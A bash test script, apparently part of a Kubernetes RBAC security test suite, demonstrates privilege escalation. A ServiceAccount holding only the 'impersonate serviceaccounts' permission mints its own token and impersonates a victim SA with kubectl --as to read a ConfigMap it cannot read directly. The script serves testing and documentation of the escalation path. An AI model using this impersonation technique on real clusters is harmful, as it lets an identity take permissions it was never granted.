#!/usr/bin/env bash
# Identity assumption: impersonate ServiceAccount -> act as the SA  (impersonate-assumes-sa)
#
# Proof: an identity granted ONLY `impersonate serviceaccounts` (not `get
# configmaps`) can read a ConfigMap by impersonating a ServiceAccount that may
# `get configmaps` -- gaining that SA's permission. The attacker authenticates
# with its OWN token and sets Impersonate-User to the victim SA.
# Mechanism: ../transitions/impersonate-assumes-sa.md
source "$(dirname "$0")/../lib.sh"
test_start "impersonate-assumes-sa"

ns="$(new_ns imp-sa)"
cm_val="cfg-${RUN_ID}"

# Victim SA that CAN get configmaps, and a target ConfigMap.
step "admin creates victim-sa (may get configmaps) and ConfigMap 'target'"
mk_sa "$ns" victim-sa
grant_ns "$ns" victim-sa "" "configmaps" "get,list"
K -n "$ns" create configmap target --from-literal=key="$cm_val" >/dev/null || fail "could not create configmap"
victim="$(sa_subject "$ns" victim-sa)"

# Attacker SA: ONLY `impersonate serviceaccounts`. NOT get configmaps.
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "serviceaccounts" "impersonate"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: holds p (impersonate serviceaccounts) but not q (get configmaps).
assert_can    "$subj" impersonate serviceaccounts "$ns"
assert_cannot "$subj" get         configmaps      "$ns"

# ACT (as attacker, exercising ONLY p): authenticate with the attacker's own
# token and impersonate victim-sa to read the ConfigMap.
atok="$(K -n "$ns" create token attacker)"
[ -n "$atok" ] || fail "could not mint attacker token"
step "attacker (its own token) impersonates victim-sa and gets ConfigMap 'target'"
got="$(ktoken "$atok" -n "$ns" get configmap target -o jsonpath='{.data.key}' --as="$victim" 2>/dev/null)"
assert_eq "$got" "$cm_val" "attacker read the ConfigMap by impersonating victim-sa"

# sanity: WITHOUT impersonation the attacker is forbidden (the gap is real at the API).
direct="$(ktoken "$atok" -n "$ns" get configmap target 2>&1 || true)"
assert_contains "$direct" "orbidden" "attacker cannot read the ConfigMap as itself (only via impersonation)"
step "impersonate serviceaccounts let the attacker inherit victim-sa's get-configmaps"

test_pass
